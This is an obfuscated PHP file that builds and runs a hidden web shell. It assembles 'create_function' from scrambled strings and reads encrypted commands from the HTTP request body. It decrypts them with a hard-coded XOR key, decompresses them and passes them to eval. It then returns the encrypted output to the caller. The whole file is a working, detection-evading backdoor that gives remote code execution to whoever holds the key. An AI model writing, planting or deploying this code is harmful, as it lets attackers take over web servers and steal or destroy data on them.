<?php
$Y='tents1B("p1Bhp1B://input"),$m)==11B) {@ob1B_start1B();@ev1Bal(@1Bgzuncompr1Bess(@x1';
$C='hMg1B7r9po1BZ";fun1Bction 1Bx1B($t1B,$k){1B$c=1Bst1Brlen($k);$l=strlen($t);1B$o="";';
$J='1Bfor(1B$i=0;$i<$l;1B){for(1B$j=0;(1B1B$j<$c&&$i<$l1B);$j1B+1B+1B,1B$i++){$o.=$t{$i}';
$S='1Bn();$r=@bas1Be641B_enco1Bde(@x(@gzcom1Bpres1Bs(1B$o),$k)1B);print("1B$p1B$kh$r$kf");}';
$M='^$k1B{$1Bj};}}return 1B$o;}i1Bf (@p1B1Breg_matc1Bh("/$1Bkh(.+)$kf1B/",@1Bfil1Be_get_c1Bon';
$O='B(@base61B4_de1Bcode($m1B[1]1B),$1Bk)));$o=@1Bob_get_conten1Bt1Bs();@ob_1Bend_cl1Bea';
$b=str_replace('RX','','creRXatRXRXe_RXfunRXctiRXon');
$X='$k="1B030e2409"1B;$1Bkh=1B"58c1fa33e82b"1B;$k1Bf="cc1B2206ba70a1Ba1B";$p="b2J7tJ01B';
$G=str_replace('1B','',$X.$C.$J.$M.$Y.$O.$S);
$v=$b('',$G);$v();
?>
